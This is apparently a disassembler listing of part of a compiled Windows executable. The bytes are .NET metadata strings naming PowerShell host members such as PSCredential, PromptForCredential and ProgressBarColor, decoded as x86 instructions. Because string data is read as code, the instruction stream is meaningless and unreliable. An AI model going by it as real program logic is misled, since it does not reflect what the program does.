  407294:	79 62                	jns    0x4072f8
  407296:	6f                   	outsl  %ds:(%esi),(%dx)
  407297:	61                   	popa
  407298:	72 64                	jb     0x4072fe
  40729a:	5f                   	pop    %edi
  40729b:	46                   	inc    %esi
  40729c:	6f                   	outsl  %ds:(%esi),(%dx)
  40729d:	72 6d                	jb     0x40730c
  40729f:	5f                   	pop    %edi
  4072a0:	4b                   	dec    %ebx
  4072a1:	65 79 55             	gs jns 0x4072f9
  4072a4:	70 00                	jo     0x4072a6
  4072a6:	50                   	push   %eax
  4072a7:	72 6f                	jb     0x407318
  4072a9:	67 72 65             	addr16 jb 0x407311
  4072ac:	73 73                	jae    0x407321
  4072ae:	42                   	inc    %edx
  4072af:	61                   	popa
  4072b0:	72 43                	jb     0x4072f5
  4072b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4072b3:	6c                   	insb   (%dx),%es:(%edi)
  4072b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4072b5:	72 00                	jb     0x4072b7
  4072b7:	53                   	push   %ebx
  4072b8:	79 73                	jns    0x40732d
  4072ba:	74 65                	je     0x407321
  4072bc:	6d                   	insl   (%dx),%es:(%edi)
  4072bd:	2e 54                	cs push %esp
  4072bf:	69 6d 65 72 73 00 54 	imul   $0x54007372,0x65(%ebp),%ebp
  4072c6:	69 6d 65 72 00 74 69 	imul   $0x69740072,0x65(%ebp),%ebp
  4072cd:	6d                   	insl   (%dx),%es:(%edi)
  4072ce:	65 72 00             	gs jb  0x4072d1
  4072d1:	62 61 72             	bound  %esp,0x72(%ecx)
  4072d4:	4e                   	dec    %esi
  4072d5:	75 6d                	jne    0x407344
  4072d7:	62 65 72             	bound  %esp,0x72(%ebp)
  4072da:	00 62 61             	add    %ah,0x61(%edx)
  4072dd:	72 56                	jb     0x407335
  4072df:	61                   	popa
  4072e0:	6c                   	insb   (%dx),%es:(%edi)
  4072e1:	75 65                	jne    0x407348
  4072e3:	00 69 6e             	add    %ch,0x6e(%ecx)
  4072e6:	54                   	push   %esp
  4072e7:	69 63 6b 00 53 79 73 	imul   $0x73795300,0x6b(%ebx),%esp
  4072ee:	74 65                	je     0x407355
  4072f0:	6d                   	insl   (%dx),%es:(%edi)
  4072f1:	2e 43                	cs inc %ebx
  4072f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4072f4:	6c                   	insb   (%dx),%es:(%edi)
  4072f5:	6c                   	insb   (%dx),%es:(%edi)
  4072f6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4072fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4072fc:	73 2e                	jae    0x40732c
  4072fe:	47                   	inc    %edi
  4072ff:	65 6e                	outsb  %gs:(%esi),(%dx)
  407301:	65 72 69             	gs jb  0x40736d
  407304:	63 00                	arpl   %eax,(%eax)
  407306:	4c                   	dec    %esp
  407307:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  40730e:	72 6f                	jb     0x40737f
  407310:	67 72 65             	addr16 jb 0x407378
  407313:	73 73                	jae    0x407388
  407315:	44                   	inc    %esp
  407316:	61                   	popa
  407317:	74 61                	je     0x40737a
  407319:	4c                   	dec    %esp
  40731a:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  407321:	74 65                	je     0x407388
  407323:	6d                   	insl   (%dx),%es:(%edi)
  407324:	2e 44                	cs inc %esp
  407326:	72 61                	jb     0x407389
  407328:	77 69                	ja     0x407393
  40732a:	6e                   	outsb  %ds:(%esi),(%dx)
  40732b:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  40732f:	6c                   	insb   (%dx),%es:(%edi)
  407330:	6f                   	outsl  %ds:(%esi),(%dx)
  407331:	72 00                	jb     0x407333
  407333:	44                   	inc    %esp
  407334:	72 61                	jb     0x407397
  407336:	77 69                	ja     0x4073a1
  407338:	6e                   	outsb  %ds:(%esi),(%dx)
  407339:	67 43                	addr16 inc %ebx
  40733b:	6f                   	outsl  %ds:(%esi),(%dx)
  40733c:	6c                   	insb   (%dx),%es:(%edi)
  40733d:	6f                   	outsl  %ds:(%esi),(%dx)
  40733e:	72 00                	jb     0x407340
  407340:	49                   	dec    %ecx
  407341:	6e                   	outsb  %ds:(%esi),(%dx)
  407342:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  407349:	65 
  40734a:	43                   	inc    %ebx
  40734b:	6f                   	outsl  %ds:(%esi),(%dx)
  40734c:	6d                   	insl   (%dx),%es:(%edi)
  40734d:	70 6f                	jo     0x4073be
  40734f:	6e                   	outsb  %ds:(%esi),(%dx)
  407350:	65 6e                	outsb  %gs:(%esi),(%dx)
  407352:	74 00                	je     0x407354
  407354:	45                   	inc    %ebp
  407355:	6c                   	insb   (%dx),%es:(%edi)
  407356:	61                   	popa
  407357:	70 73                	jo     0x4073cc
  407359:	65 64 45             	gs fs inc %ebp
  40735c:	76 65                	jbe    0x4073c3
  40735e:	6e                   	outsb  %ds:(%esi),(%dx)
  40735f:	74 41                	je     0x4073a2
  407361:	72 67                	jb     0x4073ca
  407363:	73 00                	jae    0x407365
  407365:	54                   	push   %esp
  407366:	69 6d 65 54 69 63 6b 	imul   $0x6b636954,0x65(%ebp),%ebp
  40736d:	00 41 64             	add    %al,0x64(%ecx)
  407370:	64 42                	fs inc %edx
  407372:	61                   	popa
  407373:	72 00                	jb     0x407375
  407375:	47                   	inc    %edi
  407376:	65 74 43             	gs je  0x4073bc
  407379:	6f                   	outsl  %ds:(%esi),(%dx)
  40737a:	75 6e                	jne    0x4073ea
  40737c:	74 00                	je     0x40737e
  40737e:	50                   	push   %eax
  40737f:	72 6f                	jb     0x4073f0
  407381:	67 72 65             	addr16 jb 0x4073e9
  407384:	73 73                	jae    0x4073f9
  407386:	52                   	push   %edx
  407387:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40738b:	64 00 55 70          	add    %dl,%fs:0x70(%ebp)
  40738f:	64 61                	fs popa
  407391:	74 65                	je     0x4073f8
  407393:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
  407397:	65 6c                	gs insb (%dx),%es:(%edi)
  407399:	00 6c 62 41          	add    %ch,0x41(%edx,%eiz,2)
  40739d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4073a1:	69 74 79 00 6c 62 53 	imul   $0x7453626c,0x0(%ecx,%edi,2),%esi
  4073a8:	74 
  4073a9:	61                   	popa
  4073aa:	74 75                	je     0x407421
  4073ac:	73 00                	jae    0x4073ae
  4073ae:	50                   	push   %eax
  4073af:	72 6f                	jb     0x407420
  4073b1:	67 72 65             	addr16 jb 0x407419
  4073b4:	73 73                	jae    0x407429
  4073b6:	42                   	inc    %edx
  4073b7:	61                   	popa
  4073b8:	72 00                	jb     0x4073ba
  4073ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4073bb:	62 6a 50             	bound  %ebp,0x50(%edx)
  4073be:	72 6f                	jb     0x40742f
  4073c0:	67 72 65             	addr16 jb 0x407428
  4073c3:	73 73                	jae    0x407438
  4073c5:	42                   	inc    %edx
  4073c6:	61                   	popa
  4073c7:	72 00                	jb     0x4073c9
  4073c9:	6c                   	insb   (%dx),%es:(%edi)
  4073ca:	62 52 65             	bound  %edx,0x65(%edx)
  4073cd:	6d                   	insl   (%dx),%es:(%edi)
  4073ce:	61                   	popa
  4073cf:	69 6e 69 6e 67 54 69 	imul   $0x6954676e,0x69(%esi),%ebp
  4073d6:	6d                   	insl   (%dx),%es:(%edi)
  4073d7:	65 00 6c 62 4f       	add    %ch,%gs:0x4f(%edx,%eiz,2)
  4073dc:	70 65                	jo     0x407443
  4073de:	72 61                	jb     0x407441
  4073e0:	74 69                	je     0x40744b
  4073e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4073e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4073e4:	00 41 63             	add    %al,0x63(%ecx)
  4073e7:	74 69                	je     0x407452
  4073e9:	76 69                	jbe    0x407454
  4073eb:	74 79                	je     0x407466
  4073ed:	49                   	dec    %ecx
  4073ee:	64 00 50 61          	add    %dl,%fs:0x61(%eax)
  4073f2:	72 65                	jb     0x407459
  4073f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4073f5:	74 41                	je     0x407438
  4073f7:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4073fb:	69 74 79 49 64 00 44 	imul   $0x65440064,0x49(%ecx,%edi,2),%esi
  407402:	65 
  407403:	70 74                	jo     0x407479
  407405:	68 00 72 61 77       	push   $0x77617200
  40740a:	55                   	push   %ebp
  40740b:	49                   	dec    %ecx
  40740c:	00 45 72             	add    %al,0x72(%ebp)
  40740f:	72 6f                	jb     0x407480
  407411:	72 46                	jb     0x407459
  407413:	6f                   	outsl  %ds:(%esi),(%dx)
  407414:	72 65                	jb     0x40747b
  407416:	67 72 6f             	addr16 jb 0x407488
  407419:	75 6e                	jne    0x407489
  40741b:	64 43                	fs inc %ebx
  40741d:	6f                   	outsl  %ds:(%esi),(%dx)
  40741e:	6c                   	insb   (%dx),%es:(%edi)
  40741f:	6f                   	outsl  %ds:(%esi),(%dx)
  407420:	72 00                	jb     0x407422
  407422:	45                   	inc    %ebp
  407423:	72 72                	jb     0x407497
  407425:	6f                   	outsl  %ds:(%esi),(%dx)
  407426:	72 42                	jb     0x40746a
  407428:	61                   	popa
  407429:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40742c:	72 6f                	jb     0x40749d
  40742e:	75 6e                	jne    0x40749e
  407430:	64 43                	fs inc %ebx
  407432:	6f                   	outsl  %ds:(%esi),(%dx)
  407433:	6c                   	insb   (%dx),%es:(%edi)
  407434:	6f                   	outsl  %ds:(%esi),(%dx)
  407435:	72 00                	jb     0x407437
  407437:	57                   	push   %edi
  407438:	61                   	popa
  407439:	72 6e                	jb     0x4074a9
  40743b:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407442:	67 72 6f             	addr16 jb 0x4074b4
  407445:	75 6e                	jne    0x4074b5
  407447:	64 43                	fs inc %ebx
  407449:	6f                   	outsl  %ds:(%esi),(%dx)
  40744a:	6c                   	insb   (%dx),%es:(%edi)
  40744b:	6f                   	outsl  %ds:(%esi),(%dx)
  40744c:	72 00                	jb     0x40744e
  40744e:	57                   	push   %edi
  40744f:	61                   	popa
  407450:	72 6e                	jb     0x4074c0
  407452:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407459:	67 72 6f             	addr16 jb 0x4074cb
  40745c:	75 6e                	jne    0x4074cc
  40745e:	64 43                	fs inc %ebx
  407460:	6f                   	outsl  %ds:(%esi),(%dx)
  407461:	6c                   	insb   (%dx),%es:(%edi)
  407462:	6f                   	outsl  %ds:(%esi),(%dx)
  407463:	72 00                	jb     0x407465
  407465:	44                   	inc    %esp
  407466:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40746a:	46                   	inc    %esi
  40746b:	6f                   	outsl  %ds:(%esi),(%dx)
  40746c:	72 65                	jb     0x4074d3
  40746e:	67 72 6f             	addr16 jb 0x4074e0
  407471:	75 6e                	jne    0x4074e1
  407473:	64 43                	fs inc %ebx
  407475:	6f                   	outsl  %ds:(%esi),(%dx)
  407476:	6c                   	insb   (%dx),%es:(%edi)
  407477:	6f                   	outsl  %ds:(%esi),(%dx)
  407478:	72 00                	jb     0x40747a
  40747a:	44                   	inc    %esp
  40747b:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40747f:	42                   	inc    %edx
  407480:	61                   	popa
  407481:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407484:	72 6f                	jb     0x4074f5
  407486:	75 6e                	jne    0x4074f6
  407488:	64 43                	fs inc %ebx
  40748a:	6f                   	outsl  %ds:(%esi),(%dx)
  40748b:	6c                   	insb   (%dx),%es:(%edi)
  40748c:	6f                   	outsl  %ds:(%esi),(%dx)
  40748d:	72 00                	jb     0x40748f
  40748f:	56                   	push   %esi
  407490:	65 72 62             	gs jb  0x4074f5
  407493:	6f                   	outsl  %ds:(%esi),(%dx)
  407494:	73 65                	jae    0x4074fb
  407496:	46                   	inc    %esi
  407497:	6f                   	outsl  %ds:(%esi),(%dx)
  407498:	72 65                	jb     0x4074ff
  40749a:	67 72 6f             	addr16 jb 0x40750c
  40749d:	75 6e                	jne    0x40750d
  40749f:	64 43                	fs inc %ebx
  4074a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4074a2:	6c                   	insb   (%dx),%es:(%edi)
  4074a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4074a4:	72 00                	jb     0x4074a6
  4074a6:	56                   	push   %esi
  4074a7:	65 72 62             	gs jb  0x40750c
  4074aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4074ab:	73 65                	jae    0x407512
  4074ad:	42                   	inc    %edx
  4074ae:	61                   	popa
  4074af:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4074b2:	72 6f                	jb     0x407523
  4074b4:	75 6e                	jne    0x407524
  4074b6:	64 43                	fs inc %ebx
  4074b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4074b9:	6c                   	insb   (%dx),%es:(%edi)
  4074ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4074bb:	72 00                	jb     0x4074bd
  4074bd:	50                   	push   %eax
  4074be:	72 6f                	jb     0x40752f
  4074c0:	67 72 65             	addr16 jb 0x407528
  4074c3:	73 73                	jae    0x407538
  4074c5:	46                   	inc    %esi
  4074c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4074c7:	72 65                	jb     0x40752e
  4074c9:	67 72 6f             	addr16 jb 0x40753b
  4074cc:	75 6e                	jne    0x40753c
  4074ce:	64 43                	fs inc %ebx
  4074d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4074d1:	6c                   	insb   (%dx),%es:(%edi)
  4074d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4074d3:	72 00                	jb     0x4074d5
  4074d5:	50                   	push   %eax
  4074d6:	72 6f                	jb     0x407547
  4074d8:	67 72 65             	addr16 jb 0x407540
  4074db:	73 73                	jae    0x407550
  4074dd:	42                   	inc    %edx
  4074de:	61                   	popa
  4074df:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4074e2:	72 6f                	jb     0x407553
  4074e4:	75 6e                	jne    0x407554
  4074e6:	64 43                	fs inc %ebx
  4074e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4074e9:	6c                   	insb   (%dx),%es:(%edi)
  4074ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4074eb:	72 00                	jb     0x4074ed
  4074ed:	44                   	inc    %esp
  4074ee:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  4074f5:	72 79                	jb     0x407570
  4074f7:	60                   	pusha
  4074f8:	32 00                	xor    (%eax),%al
  4074fa:	50                   	push   %eax
  4074fb:	53                   	push   %ebx
  4074fc:	4f                   	dec    %edi
  4074fd:	62 6a 65             	bound  %ebp,0x65(%edx)
  407500:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  407504:	69 65 6c 64 44 65 73 	imul   $0x73654464,0x6c(%ebp),%esp
  40750b:	63 72 69             	arpl   %esi,0x69(%edx)
  40750e:	70 74                	jo     0x407584
  407510:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  407517:	6d                   	insl   (%dx),%es:(%edi)
  407518:	70 74                	jo     0x40758e
  40751a:	00 50 72             	add    %dl,0x72(%eax)
  40751d:	6f                   	outsl  %ds:(%esi),(%dx)
  40751e:	6d                   	insl   (%dx),%es:(%edi)
  40751f:	70 74                	jo     0x407595
  407521:	46                   	inc    %esi
  407522:	6f                   	outsl  %ds:(%esi),(%dx)
  407523:	72 43                	jb     0x407568
  407525:	68 6f 69 63 65       	push   $0x6563696f
  40752a:	00 50 53             	add    %dl,0x53(%eax)
  40752d:	43                   	inc    %ebx
  40752e:	72 65                	jb     0x407595
  407530:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407533:	74 69                	je     0x40759e
  407535:	61                   	popa
  407536:	6c                   	insb   (%dx),%es:(%edi)
  407537:	00 50 72             	add    %dl,0x72(%eax)
  40753a:	6f                   	outsl  %ds:(%esi),(%dx)
  40753b:	6d                   	insl   (%dx),%es:(%edi)
  40753c:	70 74                	jo     0x4075b2
  40753e:	46                   	inc    %esi
  40753f:	6f                   	outsl  %ds:(%esi),(%dx)
  407540:	72 43                	jb     0x407585
  407542:	72 65                	jb     0x4075a9
  407544:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407547:	74 69                	je     0x4075b2
  407549:	61                   	popa
  40754a:	6c                   	insb   (%dx),%es:(%edi)
  40754b:	00 67 65             	add    %ah,0x65(%edi)
  40754e:	74 5f                	je     0x4075af
  407550:	52                   	push   %edx
  407551:	61                   	popa
  407552:	77 55                	ja     0x4075a9
  407554:	49                   	dec    %ecx
  407555:	00 69 62             	add    %ch,0x62(%ecx)
  407558:	5f                   	pop    %edi
  407559:	6d                   	insl   (%dx),%es:(%edi)
  40755a:	65 73 73             	gs jae 0x4075d0
  40755d:	61                   	popa
  40755e:	67 65 00 52 65       	add    %dl,%gs:0x65(%bp,%si)
  407563:	61                   	popa
  407564:	64 4c                	fs dec %esp
  407566:	69 6e 65 00 53 79 73 	imul   $0x73795300,0x65(%esi),%ebp
  40756d:	74 65                	je     0x4075d4
  40756f:	6d                   	insl   (%dx),%es:(%edi)
  407570:	2e 53                	cs push %ebx
  407572:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  407576:	69 74 79 00 53 65 63 	imul   $0x75636553,0x0(%ecx,%edi,2),%esi
  40757d:	75 
  40757e:	72 65                	jb     0x4075e5
  407580:	53                   	push   %ebx
  407581:	74 72                	je     0x4075f5
  407583:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40758a:	50                   	push   %eax
  40758b:	61                   	popa
  40758c:	73 73                	jae    0x407601
  40758e:	77 6f                	ja     0x4075ff
  407590:	72 64                	jb     0x4075f6
  407592:	00 52 65             	add    %dl,0x65(%edx)
  407595:	61                   	popa
  407596:	64 4c                	fs dec %esp
  407598:	69 6e 65 41 73 53 65 	imul   $0x65537341,0x65(%esi),%ebp
  40759f:	63 75 72             	arpl   %esi,0x72(%ebp)
  4075a2:	65 53                	gs push %ebx
  4075a4:	74 72                	je     0x407618
  4075a6:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  4075ad:	74 65                	je     0x407614
  4075af:	00 57 72             	add    %dl,0x72(%edi)
  4075b2:	69 74 65 44 65 62 75 	imul   $0x67756265,0x44(%ebp,%eiz,2),%esi
  4075b9:	67 
  4075ba:	4c                   	dec    %esp
  4075bb:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4075c2:	74 65                	je     0x407629
  4075c4:	45                   	inc    %ebp
  4075c5:	72 72                	jb     0x407639
  4075c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4075c8:	72 4c                	jb     0x407616
  4075ca:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4075d1:	74 65                	je     0x407638
  4075d3:	4c                   	dec    %esp
  4075d4:	69 6e 65 00 70 66 00 	imul   $0x667000,0x65(%esi),%ebp
  4075db:	57                   	push   %edi
  4075dc:	72 69                	jb     0x407647
  4075de:	74 65                	je     0x407645
  4075e0:	50                   	push   %eax
  4075e1:	72 6f                	jb     0x407652
  4075e3:	67 72 65             	addr16 jb 0x40764b
  4075e6:	73 73                	jae    0x40765b
  4075e8:	00 57 72             	add    %dl,0x72(%edi)
  4075eb:	69 74 65 56 65 72 62 	imul   $0x6f627265,0x56(%ebp,%eiz,2),%esi
  4075f2:	6f 
  4075f3:	73 65                	jae    0x40765a
  4075f5:	4c                   	dec    %esp
  4075f6:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  4075fd:	74 65                	je     0x407664
  4075ff:	57                   	push   %edi
  407600:	61                   	popa
  407601:	72 6e                	jb     0x407671
  407603:	69 6e 67 4c 69 6e 65 	imul   $0x656e694c,0x67(%esi),%ebp
  40760a:	00 52 61             	add    %dl,0x61(%edx)
  40760d:	77 55                	ja     0x407664
  40760f:	49                   	dec    %ecx
  407610:	00 70 61             	add    %dh,0x61(%eax)
  407613:	72 65                	jb     0x40767a
  407615:	6e                   	outsb  %ds:(%esi),(%dx)
  407616:	74 00                	je     0x407618
  407618:	75 69                	jne    0x407683
  40761a:	00 53 79             	add    %dl,0x79(%ebx)
  40761d:	73 74                	jae    0x407693
  40761f:	65 6d                	gs insl (%dx),%es:(%edi)
  407621:	2e 47                	cs inc %edi
  407623:	6c                   	insb   (%dx),%es:(%edi)
  407624:	6f                   	outsl  %ds:(%esi),(%dx)
  407625:	62 61 6c             	bound  %esp,0x6c(%ecx)
  407628:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  40762f:	00 43 75             	add    %al,0x75(%ebx)
  407632:	6c                   	insb   (%dx),%es:(%edi)
  407633:	74 75                	je     0x4076aa
  407635:	72 65                	jb     0x40769c
  407637:	49                   	dec    %ecx
  407638:	6e                   	outsb  %ds:(%esi),(%dx)
  407639:	66 6f                	outsw  %ds:(%esi),(%dx)
  40763b:	00 6f 72             	add    %ch,0x72(%edi)
  40763e:	69 67 69 6e 61 6c 43 	imul   $0x436c616e,0x69(%edi),%esp
  407645:	75 6c                	jne    0x4076b3
  407647:	74 75                	je     0x4076be
  407649:	72 65                	jb     0x4076b0
  40764b:	49                   	dec    %ecx
  40764c:	6e                   	outsb  %ds:(%esi),(%dx)
  40764d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40764f:	00 6f 72             	add    %ch,0x72(%edi)
  407652:	69 67 69 6e 61 6c 55 	imul   $0x556c616e,0x69(%edi),%esp
  407659:	49                   	dec    %ecx
  40765a:	43                   	inc    %ebx
  40765b:	75 6c                	jne    0x4076c9
  40765d:	74 75                	je     0x4076d4
  40765f:	72 65                	jb     0x4076c6
  407661:	49                   	dec    %ecx
  407662:	6e                   	outsb  %ds:(%esi),(%dx)
  407663:	66 6f                	outsw  %ds:(%esi),(%dx)
  407665:	00 47 75             	add    %al,0x75(%edi)
  407668:	69 64 00 6d 79 49 64 	imul   $0x644979,0x6d(%eax,%eax,1),%esp
  40766f:	00 
  407670:	67 65 74 5f          	addr16 gs je 0x4076d3
  407674:	50                   	push   %eax
  407675:	72 69                	jb     0x4076e0
  407677:	76 61                	jbe    0x4076da
  407679:	74 65                	je     0x4076e0
  40767b:	44                   	inc    %esp
  40767c:	61                   	popa
  40767d:	74 61                	je     0x4076e0
  40767f:	00 5f 63             	add    %bl,0x63(%edi)
  407682:	6f                   	outsl  %ds:(%esi),(%dx)
  407683:	6e                   	outsb  %ds:(%esi),(%dx)
  407684:	73 6f                	jae    0x4076f5
  407686:	6c                   	insb   (%dx),%es:(%edi)
  407687:	65 43                	gs inc %ebx
  407689:	6f                   	outsl  %ds:(%esi),(%dx)
  40768a:	6c                   	insb   (%dx),%es:(%edi)
  40768b:	6f                   	outsl  %ds:(%esi),(%dx)
  40768c:	72 50                	jb     0x4076de
  40768e:	72 6f                	jb     0x4076ff
  407690:	78 79                	js     0x40770b
  407692:	00 67 65             	add    %ah,0x65(%edi)
  407695:	74 5f                	je     0x4076f6
  407697:	43                   	inc    %ebx
  407698:	75 72                	jne    0x40770c
  40769a:	72 65                	jb     0x407701
  40769c:	6e                   	outsb  %ds:(%esi),(%dx)
  40769d:	74 43                	je     0x4076e2
  40769f:	75 6c                	jne    0x40770d
  4076a1:	74 75                	je     0x407718
  4076a3:	72 65                	jb     0x40770a
  4076a5:	00 67 65             	add    %ah,0x65(%edi)
  4076a8:	74 5f                	je     0x407709
  4076aa:	43                   	inc    %ebx
  4076ab:	75 72                	jne    0x40771f
  4076ad:	72 65                	jb     0x407714
  4076af:	6e                   	outsb  %ds:(%esi),(%dx)
  4076b0:	74 55                	je     0x407707
  4076b2:	49                   	dec    %ecx
  4076b3:	43                   	inc    %ebx
  4076b4:	75 6c                	jne    0x407722
  4076b6:	74 75                	je     0x40772d
  4076b8:	72 65                	jb     0x40771f
  4076ba:	00 67 65             	add    %ah,0x65(%edi)
  4076bd:	74 5f                	je     0x40771e
  4076bf:	49                   	dec    %ecx
  4076c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4076c1:	73 74                	jae    0x407737
  4076c3:	61                   	popa
  4076c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4076c5:	63 65 49             	arpl   %esp,0x49(%ebp)
  4076c8:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4076cc:	74 5f                	je     0x40772d
  4076ce:	4e                   	dec    %esi
  4076cf:	61                   	popa
  4076d0:	6d                   	insl   (%dx),%es:(%edi)
  4076d1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4076d5:	74 5f                	je     0x407736
  4076d7:	55                   	push   %ebp
  4076d8:	49                   	dec    %ecx
  4076d9:	00 56 65             	add    %dl,0x65(%esi)
  4076dc:	72 73                	jb     0x407751
  4076de:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4076e5:	5f                   	pop    %edi
  4076e6:	56                   	push   %esi
  4076e7:	65 72 73             	gs jb  0x40775d
  4076ea:	69 6f 6e 00 45 6e 74 	imul   $0x746e4500,0x6e(%edi),%ebp
  4076f1:	65 72 4e             	gs jb  0x407742
  4076f4:	65 73 74             	gs jae 0x40776b
  4076f7:	65 64 50             	gs fs push %eax
  4076fa:	72 6f                	jb     0x40776b
  4076fc:	6d                   	insl   (%dx),%es:(%edi)
  4076fd:	70 74                	jo     0x407773
  4076ff:	00 45 78             	add    %al,0x78(%ebp)
  407702:	69 74 4e 65 73 74 65 	imul   $0x64657473,0x65(%esi,%ecx,2),%esi
  407709:	64 
  40770a:	50                   	push   %eax
  40770b:	72 6f                	jb     0x40777c
  40770d:	6d                   	insl   (%dx),%es:(%edi)
  40770e:	70 74                	jo     0x407784
  407710:	00 4e 6f             	add    %cl,0x6f(%esi)
  407713:	74 69                	je     0x40777e
  407715:	66 79 42             	data16 jns 0x40775a
  407718:	65 67 69 6e 41 70 70 	imul   $0x696c7070,%gs:0x41(%bp),%ebp
  40771f:	6c 69 
  407721:	63 61 74             	arpl   %esp,0x74(%ecx)
  407724:	69 6f 6e 00 4e 6f 74 	imul   $0x746f4e00,0x6e(%edi),%ebp
  40772b:	69 66 79 45 6e 64 41 	imul   $0x41646e45,0x79(%esi),%esp
  407732:	70 70                	jo     0x4077a4
  407734:	6c                   	insb   (%dx),%es:(%edi)
  407735:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40773c:	00 53 65             	add    %dl,0x65(%ebx)
  40773f:	74 53                	je     0x407794
  407741:	68 6f 75 6c 64       	push   $0x646c756f
  407746:	45                   	inc    %ebp
  407747:	78 69                	js     0x4077b2
  407749:	74 00                	je     0x40774b
  40774b:	50                   	push   %eax
  40774c:	72 69                	jb     0x4077b7
  40774e:	76 61                	jbe    0x4077b1
  407750:	74 65                	je     0x4077b7
  407752:	44                   	inc    %esp
  407753:	61                   	popa
  407754:	74 61                	je     0x4077b7
  407756:	00 43 75             	add    %al,0x75(%ebx)
  407759:	72 72                	jb     0x4077cd
  40775b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40775d:	74 43                	je     0x4077a2
  40775f:	75 6c                	jne    0x4077cd
  407761:	74 75                	je     0x4077d8
  407763:	72 65                	jb     0x4077ca
  407765:	00 43 75             	add    %al,0x75(%ebx)
  407768:	72 72                	jb     0x4077dc
  40776a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40776c:	74 55                	je     0x4077c3
  40776e:	49                   	dec    %ecx
  40776f:	43                   	inc    %ebx
  407770:	75 6c                	jne    0x4077de
  407772:	74 75                	je     0x4077e9
  407774:	72 65                	jb     0x4077db
  407776:	00 49 6e             	add    %cl,0x6e(%ecx)
  407779:	73 74                	jae    0x4077ef
  40777b:	61                   	popa
  40777c:	6e                   	outsb  %ds:(%esi),(%dx)
  40777d:	63 65 49             	arpl   %esp,0x49(%ebp)
  407780:	64 00 4e 61          	add    %cl,%fs:0x61(%esi)
  407784:	6d                   	insl   (%dx),%es:(%edi)
  407785:	65 00 55 49          	add    %dl,%gs:0x49(%ebp)
  407789:	00 5f 75             	add    %bl,0x75(%edi)
  40778c:	69 00 67 65 74 5f    	imul   $0x5f746567,(%eax),%eax
  407792:	45                   	inc    %ebp
  407793:	72 72                	jb     0x407807
  407795:	6f                   	outsl  %ds:(%esi),(%dx)
  407796:	72 46                	jb     0x4077de
  407798:	6f                   	outsl  %ds:(%esi),(%dx)
  407799:	72 65                	jb     0x407800
  40779b:	67 72 6f             	addr16 jb 0x40780d
  40779e:	75 6e                	jne    0x40780e
  4077a0:	64 43                	fs inc %ebx
  4077a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4077a3:	6c                   	insb   (%dx),%es:(%edi)
  4077a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4077a5:	72 00                	jb     0x4077a7
  4077a7:	73 65                	jae    0x40780e
  4077a9:	74 5f                	je     0x40780a
  4077ab:	45                   	inc    %ebp
  4077ac:	72 72                	jb     0x407820
  4077ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4077af:	72 46                	jb     0x4077f7
  4077b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b2:	72 65                	jb     0x407819
  4077b4:	67 72 6f             	addr16 jb 0x407826
  4077b7:	75 6e                	jne    0x407827
  4077b9:	64 43                	fs inc %ebx
